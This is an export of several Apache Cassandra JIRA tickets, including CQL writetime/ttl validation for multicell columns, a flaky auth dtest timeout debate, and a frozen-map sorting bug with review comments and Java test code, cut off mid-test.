roles|https://github.com/apache/cassandra/blob/cassandra-2.2/src/java/org/apache/cassandra/auth/CassandraRoleManager.java#L388] and the schema for them hasn't been loaded on the receiving node yet.

On node3:
{noformat}
WARN  [MessagingService-Incoming-/127.0.0.1] 2022-05-18 18:36:04,397 IncomingTcpConnection.java:100 - UnknownColumnFamilyException reading from socket; closing
org.apache.cassandra.db.UnknownColumnFamilyException: Got slice command for nonexistent table system_auth.roles.  If the table was just created, this is likely due to the schema not being fully propagated.  Please wait for schema agreement on table creation.
{noformat}

On node2, about a second later:
{noformat}
INFO  [OptionalTasks:1] 2022-05-18 18:36:05,660 CassandraRoleManager.java:378 - Created default superuser role 'cassandra'
{noformat}

If anything, this is a bug in 2.2 but it's not relevant now so I've added this to the ignore fixture [here|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17629].  I'll check back when the 500 circle runs that are going [here|https://app.circleci.com/pipelines/github/driftx/cassandra/489/workflows/ee33f6d5-e4a9-4021-aed5-a92a32ced896] finish.;;;","19/May/22 11:48;brandon.williams;CI looks good.;;;","19/May/22 12:24;brandon.williams;I think this will solve CASSANDRA-17627 as well.;;;","20/May/22 06:21;bereng;LGTM +1;;;","20/May/22 10:32;brandon.williams;Committed, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
CQL writetime and ttl functions should be forbidden for multicell columns,CASSANDRA-17628,13445141,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,adelapena,adelapena,adelapena,16/May/22 10:16,05/Oct/22 22:30,13/Jul/23 08:40,27/Jun/22 14:34,3.0.28,3.11.14,4.0.5,4.1,4.1-alpha1,5.0,CQL/Semantics,,,,0,,"CQL {{writetime}} and {{ttl}} functions are currently forbidden for collections, frozen or not. Also, they are always allowed for UDTs, frozen or not:
{code}
CREATE TYPE udt (a int, b int);
CREATE TABLE t (k int PRIMARY KEY, s set<int>, fs frozen<set<int>>, t udt, ft frozen<udt>);

SELECT writetime(s) FROM t; -- fails
SELECT writetime(st) FROM t; -- fails
SELECT writetime(t) FROM t; -- allowed
SELECT writetime(ft) FROM t; -- allowed
{code}
This is done by checking in [{{Selectable.WritetimeOrTTL#newSelectorFactory}}|https://github.com/apache/cassandra/blob/cassandra-4.0.4/src/java/org/apache/cassandra/cql3/selection/Selectable.java#L250] whether the column is a collection or not. However, I think that what we should check is whether the column is multi-cell. That way the function would work with frozen collections and UDTs, and it would reject unfrozen collections and UDTs:
{code}
SELECT writetime(s) FROM t; -- fails
SELECT writetime(st) FROM t; -- allowed
SELECT writetime(t) FROM t; -- fails
SELECT writetime(ft) FROM t; -- allowed
{code} ",,adelapena,bereng,e.dimitrova,jmckenzie,maedhroz,,,,,,,,,,"bereng commented on PR #1693:
URL: https://github.com/apache/cassandra/pull/1693#issuecomment-1162640108

   @adelapena do we need to add testing for `maxwritetime` here?


;22/Jun/22 04:56;githubbot;600","adelapena commented on PR #1693:
URL: https://github.com/apache/cassandra/pull/1693#issuecomment-1162854364

   > @adelapena do we need to add testing for `maxwritetime` here?
   
   It would be nice to add some basic coverage in the new test class, yes. Note that there are more detailed tests for `maxwritetime` on [`TimestampTest`](https://github.com/apache/cassandra/blob/26dd119679605bf61ad3caa24a70509e5be5aac9/test/unit/org/apache/cassandra/cql3/validation/entities/TimestampTest.java#L115-L181). I have modified the proposed `WritetimeOrTTLTest` to include some checks on `maxwritetime`.


;22/Jun/22 09:14;githubbot;600","smiklosovic closed pull request #1693: CASSANDRA-17628 trunk: CQL writetime and ttl functions should be forbidden for multicell columns
URL: https://github.com/apache/cassandra/pull/1693


;30/Jun/22 06:20;githubbot;600","smiklosovic closed pull request #1692: CASSANDRA-17628 4.1: CQL writetime and ttl functions should be forbidden for multicell columns
URL: https://github.com/apache/cassandra/pull/1692


;30/Jun/22 06:20;githubbot;600","smiklosovic closed pull request #1691: CASSANDRA-17628 4.0: CQL writetime and ttl functions should be forbidden for multicell columns
URL: https://github.com/apache/cassandra/pull/1691


;30/Jun/22 06:20;githubbot;600","smiklosovic closed pull request #1690: CASSANDRA-17628 3.11: CQL writetime and ttl functions should be forbidden for multicell columns
URL: https://github.com/apache/cassandra/pull/1690


;30/Jun/22 06:20;githubbot;600","smiklosovic closed pull request #1689: CASSANDRA-17628 3.0: CQL writetime and ttl functions should be forbidden for multicell columns
URL: https://github.com/apache/cassandra/pull/1689


;30/Jun/22 06:20;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,4200,,,0,4200,,CASSANDRA-17681,,,,,,,,,,,,,,,,,,,CASSANDRA-8877,,,,,,,,,,,,,,CASSANDRA-17425,,,,,,,,,,,,0.0,adelapena,,,,,,,,,,,,,,Correctness -> API / Semantic Definition,,,,,,,,Low Hanging Fruit,Adhoc Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jul 06 15:51:55 UTC 2022,,,,,,,All,,,,"0|z12e8g:",9223372036854775807,,,,bereng,,,,Normal,,2.1.13,,https://github.com/apache/cassandra/commit/09692d5a58d96089c699f59e9b7daacd066e902d,,,,,,,,,New tests are included,,,,,"17/Jun/22 11:21;adelapena;The proposed patch modifies the validation rule so {{writetime}} and {{ttl}} functions can be used in frozen collections and UDTs, and it's disallowed in non-frozen collections and UDTs. CI is running:
||PR||CI||
|[3.0 |https://github.com/apache/cassandra/pull/1689]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1710/workflows/5032d34c-6814-4b48-b693-4555c0897ed1]|
|[3.11 |https://github.com/apache/cassandra/pull/1690]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1711/workflows/a5a46d02-051e-4211-8819-800fa1ae0ad3]|
|[4.0 |https://github.com/apache/cassandra/pull/1691]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1709/workflows/9d4dc479-e1c1-4698-8ddf-98fb4194ea0c] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1709/workflows/a4d71be0-cc5e-4614-92fd-8e6ae389131d]|
|[4.1 |https://github.com/apache/cassandra/pull/1692]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1713/workflows/902d8e2b-d387-4406-a39b-da53d81396cc] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1713/workflows/c9c4df7c-3f4a-4cd8-96b6-90cbd4981042]|
|[trunk|https://github.com/apache/cassandra/pull/1693]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1712/workflows/bd5be509-a885-41c2-b803-4d9ef2c30235] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1712/workflows/0b724b48-0b0c-4c65-9dbb-fea6c9e6a0a8]|;;;","17/Jun/22 11:22;adelapena;CC [~yifanc];;;","20/Jun/22 08:29;bereng;^Should we mention this on the docs? There is a specific section for these functions :thinking:;;;","20/Jun/22 11:21;adelapena;Makes sense, I have added a note on the doc saying that the {{WRITETIME}} and {{TTL}} functions can't be used on multi-cell columns such as non-frozen collections or non-frozen user-defined types.;;;","21/Jun/22 01:37;e.dimitrova;Triaging the 4.1 blockers, is this one a beta blocker? It seems from the list of versions it is not a regression? Shall we remove the 4.1-beta from the list until it is committed? ;;;","21/Jun/22 05:25;bereng;Sthg happened to the 3.0 PR right? I see unrelated commits?;;;","21/Jun/22 11:03;adelapena;{quote}Triaging the 4.1 blockers, is this one a beta blocker? It seems from the list of versions it is not a regression? Shall we remove the 4.1-beta from the list until it is committed?
{quote}
Correct, it's not a regression but a bug that has always been there. Removing 4.1-beta for now.
{quote}Sthg happened to the 3.0 PR right? I see unrelated commits?
{quote}
Right, it should have happened during rebase. I have fixed it, [here|https://app.circleci.com/pipelines/github/adelapena/cassandra/1719/workflows/22cf683e-2c18-4c89-9f50-f492f6e459ed] is CI again.;;;","22/Jun/22 09:27;bereng;Not an area of code I am familiar with but for what I've seen LGTM +1 after adding {{maxwritetime}} tests.;;;","27/Jun/22 14:26;adelapena;Committed to 3.0 as [09692d5a58d96089c699f59e9b7daacd066e902d|https://github.com/apache/cassandra/commit/09692d5a58d96089c699f59e9b7daacd066e902d] and merged to [3.11|https://github.com/apache/cassandra/commit/bc8a2604718284b95da52205a9b95b8a69483661], [4.0|https://github.com/apache/cassandra/commit/90e2502c6c7826bdb14cebcece81440307a7420e], [4.1|https://github.com/apache/cassandra/commit/33730d9d0603cc110fb8da68d9663b4d52e9b7e6] and [trunk|https://github.com/apache/cassandra/commit/f8207fe28748a168a76f73db37dec8d42dd67a7a]. 

Thanks for the review.;;;","06/Jul/22 15:51;jmckenzie;[CI Results]
Branch: 4.1, build number: 78
   butler url: https://butler.cassandra.apache.org/#/ci/upstream/compare/Cassandra-4.1/Cassandra-4.1
   jenkins url: https://ci-cassandra.apache.org/job/Cassandra-4.1/78/
   JIRA: CASSANDRA-17628
   commit url: https://gitbox.apache.org/repos/asf?p=cassandra.git;a=commit;h=09692d5a58d96089c699f59e9b7daacd066e902d
   affected paths:
* CHANGES.txt
* doc/cql3/CQL.textile
* src/java/org/apache/cassandra/cql3/selection/Selectable.java
* test/unit/org/apache/cassandra/cql3/validation/entities/WritetimeOrTTLTest.java

   Build Result: UNSTABLE
   Passing Tests: 47482
   Failing Tests: 10

||Test|Failures|JIRA||
|org.apache.cassandra.db.compaction.SingleSSTableLCSTaskTest.uplevelDisabledTest|3 of 75|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV4Upgrade_AllVersions_EndsAt_Trunk_HEAD.test_parallel_upgrade|3 of 75|[CASSANDRA-17296?|https://issues.apache.org/jira/browse/CASSANDRA-17296]|
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testWriteOnlyIndex|6 of 75|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.ViewComplexTTLTest.testUpdateColumnInViewPKWithTTLWithFlush[3]|14 of 75|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.upgrade.MixedModeFrom3UnloggedBatchTest.testSimpleStrategy|5 of 75|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.distributed.test.CASTest.testConflictingWritesWithStaleRingInformation|18 of 75|[CASSANDRA-17461?|https://issues.apache.org/jira/browse/CASSANDRA-17461]|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestUpgrade_current_3_0_x_To_indev_4_1_x.test_bootstrap_multidc|2 of 75|[Multiple JIRAs found|https://issues.apache.org/jira/issues/?jql=project%20%3D%20CASSANDRA%20and%20resolution%20%3D%20unresolved%20and%20summary%20~%20""*TestUpgrade*""]
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testIndexOnCountersInvalid|3 of 75|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.operations.SelectTest.filteringWithOrderClause|5 of 75|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
|org.apache.cassandra.cql3.validation.entities.SecondaryIndexTest.testCanQuerySecondaryIndex|6 of 75|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test Failure: dtest-offheap.auth_test.TestAuth.test_system_auth_ks_is_alterable (from Cassandra dtests),CASSANDRA-17625,13444895,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,jmckenzie,jmckenzie,13/May/22 18:26,07/Mar/23 10:38,13/Jul/23 08:40,08/Jun/22 05:24,4.1.x,4.1-beta1,5.0,,,,Test/dtest/python,,,,0,,"Flaked a couple times on 4.1

{code}
Error Message
cassandra.DriverException: Keyspace metadata was not refreshed. See log for details.
{code}

https://ci-cassandra.apache.org/job/Cassandra-4.1/14/testReport/dtest-offheap.auth_test/TestAuth/test_system_auth_ks_is_alterable/

Nightlies archive if above dropped: https://nightlies.apache.org/cassandra/ci-cassandra.apache.org/job/Cassandra-4.1/14/testReport/dtest-offheap.auth_test/TestAuth/test_system_auth_ks_is_alterable/",,bereng,e.dimitrova,jmckenzie,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Jun 08 05:26:16 UTC 2022,,,,,,,All,,,,"0|z12cps:",9223372036854775807,,,,jmckenzie,,,,Normal,,4.1,,https://github.com/apache/cassandra-dtest/commit/511df040525543383a979e6d20e9ab150af7e7fe,,,,,,,,,See PR,,,,,"18/May/22 09:46;bereng;I haven't been able, despite much thinking, of coming up with a better theory than a legit timeout. I've seen updates take more than 30s on overloaded dtests so...;;;","27/May/22 14:58;e.dimitrova;The links expired, I don't see this failure in Butler on 4.1 or trunk.

Trying to reproduce without the patch [here|https://app.circleci.com/pipelines/github/ekaterinadimitrova2/cassandra?branch=17625-4.1&filter=all] using:

 
{code:java}
.circleci/generate.sh -m \
-e REPEATED_DTEST_NAME=auth_test.py::TestAuth::test_system_auth_ks_is_alterable \
-e REPEATED_DTEST_VNODES=false \
-e REPEATED_DTEST_COUNT=500 \
-e REPEATED_DTEST_STOP_ON_FAILURE=false
{code}
 ;;;","27/May/22 16:43;e.dimitrova;This failure is not reproducible and I think it was random timeout. I would suggest we close the ticket without raising the 30s further for now. ;;;","27/May/22 18:35;e.dimitrova;If we still want to raise it, I wouldn't make it double though... maybe 40s at most;;;","30/May/22 05:43;bereng;[~e.dimitrova] iirc I think I managed to repro adding sleeps and playing with timeouts to make sure I hit the scenario I was after. Does this help you repro it?

Also I have seen a simple update on dtests take 30s, so raising it it's still a good idea imo. I don't know if 40s will make a difference though being this a schema change rather than a single simple update. 60s, finger in the air, sounded better. Wdyt?;;;","30/May/22 14:14;e.dimitrova;{quote}[~e.dimitrova] iirc I think I managed to repro adding sleeps and playing with timeouts to make sure I hit the scenario I was after. Does this help you repro it?
{quote}
Can you share the steps, please? I guess you still have them as you tested the patch. Thanks in advance;;;","31/May/22 05:29;bereng;Not only I don't have them. But on Ubuntu 22 seems we can't run dtests. I am swimming in a sea of exceptions while trying to run dtests bc of python vs pytest vs libs vs the universe. Which worries me as more people will start using Ubuntu 22 soon.

Anyway let me see if this helps: There is a python wrapper that will force a wait on schema agreement and it observes {{max_schema_agreement_wait}}. This is forced through so trying a '1' here and seeing what happens would be my first test. That would, if your PC is slow enough, render the error we're after. If that doesn't work you can always play with {{wait_for_schema_agreement}} to shave or add a few seconds here and there to artificially repro the error.

This is why on a very heavily loaded system you can hit this imo as after much looking around I didn't find any problems unless I missed sthg. Hence giving more time for the schemas to agree, which seems was already a concern of the original author also, seems the best bet and matches the repro and the stack traces imo.;;;","31/May/22 09:35;bereng;Ok I managed to crawl myself out of the libs hell

{noformat}
11:33:16,761 ccm DEBUG Log-watching thread exiting.
===Flaky Test Report===

test_system_auth_ks_is_alterable failed and was not selected for rerun.
	<class 'cassandra.DriverException'>
	Keyspace metadata was not refreshed. See log for details.
	[<TracebackEntry /home/bereng/work/repos/bdpWS/dtests/auth_test.py:69>, <TracebackEntry /home/bereng/work/repos/bdpWS/dtests/tools/metadata_wrapper.py:10>, <TracebackEntry /home/bereng/work/repos/bdpWS/dtests/tools/metadata_wrapper.py:57>, <TracebackEntry /home/bereng/work/repos/bdpWS/dtests/src/cassandra-driver/cassandra/cluster.py:2162>]
{noformat}

This is by forcing {{wait_for_schema_agreement}} to return False to simulate a timeout on schema agreement. My 2cts.;;;","31/May/22 19:58;e.dimitrova;I still do not think we should raise it now. Moreover, there were a lot of CI issues and now things are back to normal and this test is not seen being failing.

Neither  we can reproduce it after hundreds of runs without skipping the wait time. I am +0 on this change;;;","01/Jun/22 05:00;bereng;Well this failed on jenkins not circle iiuc. And we know sometimes they repro on one place but not another. Also after all the effort I put into it it would be a pity imo we don't take this chance to harden this now that it's free money on the table imo. Like I don't see any disadvantages merging this but only advantages.

I am a strong +1 on merging this so unless you disagree I still want to merge it. Otherwise we can ask sbdy else to break the tie sort to speak? wdyt?;;;","01/Jun/22 14:35;e.dimitrova;{quote}Well this failed on jenkins not circle iiuc. And we know sometimes they repro on one place but not another.
{quote}
True,  but it doesn't fail in Jenkins too after the infra issues were solved. 

If currently the other tests go with default 10 and we don't see a need to raise it, but this one starts failing with more than 3 times longer delay I would love to know why tbh. Now you spent the time to confirm that it was just our infra. The infra is fixed and I don't see a reason to make it 6 times the default delay.

Maybe [~jmckenzie] as a reporter or anyone else can also express opinion here. ;;;","02/Jun/22 07:39;bereng;bq. True,  but it doesn't fail in Jenkins too after the infra issues were solved. 

Flakies will come and go. That it didn't fail recently is not proof it may not fail again and it's been just a few days since those were fixed. Also that is orthogonal to merging work that has already been done, cost has been incurred already and has no downside.

bq. starts failing with more than 3 times longer delay I would love to know why tbh

If it's due to a slow env, which is my guess, it can hit at any random time and some operations will be more affected than others. And there's no other thread to pull iiuc.

bq. Now you spent the time to confirm that it was just our infra

I disagree here. I only found a repro so far.

bq. The infra is fixed and I don't see a reason to make it 6 times the default delay

It's not 6 times. It was 30s and now it will be 60s. As I said I have seen other tests take 30s to insert a row. So 60s for a complex operation like a schema agreement to complete sounds reasonable to me.

All you pointed are valid questions to ask oneself. But I don't see any reason not take the free money on the table as the cost to tackle the ticket has already been incurred. [~jmckenzie] I am still a strong +1 on merging the effort put here and I don't see any disadvantage to it.


;;;","02/Jun/22 11:36;jmckenzie;Honestly, to me our arbitrary setting of timeouts on various tests and operations is a giant headache.

If a test has a timeout of 30 seconds in it, that implies that the contract with the end user we're trying to test and enforce is that the operation will complete in 30 seconds or less on hardware >= the specs of the ASF Jenkins env (our likely weakest CI env).

On those grounds, I'd advocate for all transient intra-test timeouts to be pushed up to whatever the global test timeout is (10 minutes, 15, etc), and only to enforce lower timeouts on operations in the very specific cases we are committing to an operation taking place in <= a certain amount of time.

Chasing flaky timeouts like this is not a value-add activity for the project IMO.;;;","02/Jun/22 12:04;e.dimitrova;{quote}If a test has a timeout of 30 seconds in it, that implies that the contract with the end user we're trying to test and enforce is that the operation will complete in 30 seconds or less on hardware >= the specs of the ASF Jenkins env (our likely weakest CI env).
{quote}
Hey [~jmckenzie], this is wait for schema agreement not a test timeout so definitely I wouldn't advocate for setting it to 10 minutes. :) 
{quote}It's not 6 times. It was 30s and now it will be 60s. 
{quote}
It was 10s default, raised to 30 long time ago, so now it will be 6 times and it is currently not even flaky anymore.

With all that said, I am +0 and moving away from this ticket. It's up to you and whoever assigns themselves as a reviewer.

I expressed my opinion.;;;","02/Jun/22 14:14;jmckenzie;{quote}I wouldn't advocate for setting it to 10 minutes.
{quote}
I'm advocating for the concept of ""wait for a timeout"" to always point to a global constant that we use in _literally every place_ we wait for a timeout in a test so things like this don't constantly drain our time and energy. It was 10s, we raised it to 30 a long time ago, and if 1/100 test runs it takes 31 seconds we're going to waste our time on it.

It certainly could make single pathologically bad test runs take a long time on ASF Jenkins but I think that's a reasonable price to pay.;;;","03/Jun/22 05:17;bereng;How we should improve our handling of timeouts, which could really help long term given our history, it's certainly sthg to take into account. We've had this discussion before and wondered if that would help us go green given the high number of timeouts we've historically had. Certainly a point to discuss given the drain of effort this represents. But on this particular ticket this price has already been payed.

So given this ticket has already been investigated, repro'ed and a commit proposed, which has no drawbacks, I would like to merge it so my effort doesn't go to waste. Hence why I'd like to get a +1 to merge, given it's a 1loc change it's a small ask and review imo.;;;","03/Jun/22 17:20;jmckenzie;Oh yeah for sure; sorry, I have a bad habit of making meta observations in JIRA comments which then reads as if I'm blocking work on something based on that. Totally not the intent here.

We can follow up on the dev ML about the bigger picture once we're at green on 4.1.;;;","07/Jun/22 06:02;bereng;[~jmckenzie] apologies for the late reply. I've been OOO.

Yes 1y ago I was proposing raising and/or reworking timeouts. I did create a branch and ran some tests and everything looked good. I think it would indeed be a good idea to raise that point once CI is back on track.

Regarding this particular ticket I am not sure if you're saying you've reviewed, +1'ed and are happy I merge?;;;","07/Jun/22 15:12;jmckenzie;Formally +1'ing this after barging in here like that is the least I can do.

+1 to taking timeout from 30-60. Patch looks good.;;;","08/Jun/22 05:26;bereng;lol Thx! Let's try to remember one or the other to revisit timeouts from a generic pov once 4.1 is out and CI is back to normal again.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Frozen maps may be serialized unsorted, causing inability to query later",CASSANDRA-17623,13444698,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,drohrer,drohrer,drohrer,12/May/22 20:09,05/Oct/22 22:30,13/Jul/23 08:40,20/May/22 11:04,3.0.28,3.11.14,4.0.5,4.1,4.1-alpha1,5.0,CQL/Semantics,,,,0,,"CASSANDRA-7859 introduced the ability to use frozen collections as parts of primary keys. This +requires+ all frozen maps to be persisted with their entries sorted by the map keys. If the map is +not+ sorted correctly, it becomes impossible to project all of the map values out of the map using the map projection/selection syntax. For example, the select below would fail if the map was not sorted correctly and the higher-valued key was persisted first:
{code:sql}
CREATE TABLE test.test (k text, c frozen<map<text, text>>, PRIMARY KEY (k, c));
INSERT INTO test.test (k, c) VALUES ('key', {'z':'second_value', 'a':'first_value'});
SELECT k, c['a'] from test.test where k='key' -- c['a'] would return NULL here
{code}

Additionally, if you attempted to select just that row by using the complete map value in a WHERE clause, which is also supported, it would return no rows unless the map provided by the query processor just happened to be sorted the same way as the persisted value.

However, there is a bug in Maps.java where we don't actually use a SortedMap in {{Maps.Value#fromSerialized}}, which manifests if a client sends an unsorted map as a bound parameter to a query on insert or select. In either case, the map may not be sorted correctly, leading to either invalid data being persisted to disk (in the INSERT case) or the query not being able to be executed/returning 0 rows even though a row _should_ exist (SELECT).

This bug affects any usage of parameterized queries (tested with the DataStax driver, and was originally discovered when using the CQLSSTableWriter code to write data locally).",,adelapena,brandon.williams,drohrer,e.dimitrova,frankgh,maedhroz,,,,,,,,,"adelapena commented on code in PR #1621:
URL: https://github.com/apache/cassandra/pull/1621#discussion_r873803244


##########
test/unit/org/apache/cassandra/cql3/validation/operations/InsertTest.java:
##########
@@ -247,4 +252,42 @@ public void testCKInsertWithValueOver64K() throws Throwable
         assertInvalidThrow(InvalidRequestException.class,
                            ""INSERT INTO %s (a, b) VALUES ('foo', ?)"", new String(TOO_BIG.array()));
     }
+
+    @Test
+    public void testInsertingMapDataWithParameterizedQueriesIsKeyOrderIndependent() throws Throwable

Review Comment:
   This test is mostly identical to the one on `SelectTest`, we could combine them and put them in `CollectionsTest.java`. 



##########
test/unit/org/apache/cassandra/cql3/validation/operations/InsertTest.java:
##########
@@ -247,4 +252,42 @@ public void testCKInsertWithValueOver64K() throws Throwable
         assertInvalidThrow(InvalidRequestException.class,
                            ""INSERT INTO %s (a, b) VALUES ('foo', ?)"", new String(TOO_BIG.array()));
     }
+
+    @Test
+    public void testInsertingMapDataWithParameterizedQueriesIsKeyOrderIndependent() throws Throwable
+    {
+        UUID uuid1 = UUIDs.timeBased();
+        UUID uuid2 = UUIDs.timeBased();
+        createTable(""CREATE TABLE %s (k text, c frozen<map<timeuuid, text>>, PRIMARY KEY (k, c));"");

Review Comment:
   The fix is for both maps and sets but the tests only exercise maps. I think we should add equivalent tests for sets. for example:
   ```java
   @Test
   public void testInsertingSetDataWithParameterizedQueriesIsKeyOrderIndependent() throws Throwable
   {
       UUID uuid1 = UUIDs.timeBased();
       UUID uuid2 = UUIDs.timeBased();
       createTable(""CREATE TABLE %s (k text, c frozen<set<timeuuid>>, PRIMARY KEY (k, c));"");
       // We use `executeNet` in this test because `execute` passes parameters through CqlTester#transformValues(), which calls
       // AbstractType#decompose() on the value, which ""fixes"" the map order, but wouldn't happen normally.
       executeNet(""INSERT INTO %s (k, c) VALUES ('0', ?)"", set(uuid1, uuid2));
       executeNet(""INSERT INTO %s (k, c) VALUES ('0', ?)"", set(uuid2, uuid1));
       beforeAndAfterFlush(() -> {
           assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid1 + "", "" + uuid2 + '}'), 1);
           assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid2 + "", "" + uuid1 + '}'), 1);
           assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid1 + "", "" + uuid2 + '}'), 1);
           assertRowCountNet(executeNet(""SELECT * FROM %s WHERE k='0' AND c={"" + uuid2 + "", "" + uuid1 + '}'), 1);
       });
   }
   
   @Test
   public void testInsertingSetDataWithParameterizedQueriesIsKeyOrderIndependentWithSelectSlice() throws Throwable
   {
       UUID uuid1 = UUIDs.timeBased();
       UUID uuid2 = UUIDs.timeBased();
       createTable(""CREATE TABLE %s (k text, c frozen<set<timeuuid>>, PRIMARY KEY (k, c));"");
       // We use `executeNet` in this test because `execute` passes parameters through CqlTester#transformValues(), which calls
       // AbstractType#decompose() on the value, which ""fixes"" the map order, but wouldn't happen normally.
       beforeAndAfterFlush(() -> {
           executeNet(""INSERT INTO %s (k, c) VALUES ('0', ?)"", set(uuid2, uuid1));
           assertRowsNet(executeNet(""SELECT k, c["" + uuid2 + ""] from %s""), row(""0"", uuid2));
           assertRowsNet(executeNet(""SELECT k, c["" + uuid1 + ""] from %s""), row(""0"", uuid1));
       });
   }
   ```



##########
test/unit/org/apache/cassandra/cql3/CQLTester.java:
##########
@@ -2351,4 +2359,12 @@ public boolean equals(Object o)
                 && Objects.equal(password, u.password);
         }
     }
+
+    protected static <K,V> Map<K,V> buildInsertionOrderedMap(K k1, V v1, K k2, V v2)

Review Comment:
   We can use the already existent `CQLTester#map(Object...)` instead of adding a new method.



##########
test/unit/org/apache/cassandra/io/sstable/CQLSSTableWriterTest.java:
##########
@@ -947,6 +952,180 @@ public void testDateType() throws Exception
         }
     }
 
+    @Test
+    public void testFrozenMapType() throws Exception
+    {
+        // Test to make sure we can write to `date` fields in both old and new formats
+        String schema = ""CREATE TABLE "" + qualifiedTable + "" (""
+                        + ""  k text,""
+                        + ""  c frozen<map<text, text>>,""
+                        + ""  PRIMARY KEY (k, c)""
+                        + "")"";
+        String insert = ""INSERT INTO "" + qualifiedTable + "" (k, c) VALUES (?, ?)"";
+        CQLSSTableWriter writer = CQLSSTableWriter.builder()
+                                                  .inDirectory(dataDir)
+                                                  .forTable(schema)
+                                                  .using(insert)
+                                                  .withBufferSizeInMiB(1)
+                                                  .build();
+        for (int i = 0; i < 100; i++)
+        {
+            LinkedHashMap<String, String> map = new LinkedHashMap<>();
+            map.put(""a_key"", ""av"" + i);
+            map.put(""b_key"", ""zv"" + i);
+            writer.addRow(String.valueOf(i), map);
+        }
+        for (int i = 100; i < 200; i++)
+        {
+            LinkedHashMap<String, String> map = new LinkedHashMap<>();
+            map.put(""b_key"", ""zv"" + i);
+            map.put(""a_key"", ""av"" + i);
+            writer.addRow(String.valueOf(i), map);
+        }
+        writer.close();
+        loadSSTables(dataDir, keyspace);
+
+        UntypedResultSet rs = QueryProcessor.executeInternal(""SELECT * FROM "" + qualifiedTable + "";"");
+        assertEquals(200, rs.size());
+        Map<String, Map<String, String>> map = StreamSupport.stream(rs.spliterator(), false)
+                                                            .collect(Collectors.toMap(r -> r.getString(""k""), r -> r.getFrozenMap(""c"", UTF8Type.instance, UTF8Type.instance)));
+        for (int i = 0; i < 200; i++)
+        {
+            final String expectedKey = String.valueOf(i);
+            assertTrue(map.containsKey(expectedKey));
+            Map<String, String> innerMap = map.get(expectedKey);
+            assertTrue(innerMap.containsKey(""a_key""));
+            assertEquals(innerMap.get(""a_key""), ""av"" + i);
+            assertTrue(innerMap.containsKey(""b_key""));
+            assertEquals(innerMap.get(""b_key""), ""zv"" + i);
+        }
+
+        // Make sure we can filter with map values regardless of which order we put the keys in
+        UntypedResultSet filtered;
+        filtered = QueryProcessor.executeInternal(""SELECT * FROM "" + qualifiedTable + "" where k='0' and c={'a_key': 'av0', 'b_key': 'zv0'};"");
+        assertEquals(1, filtered.size());
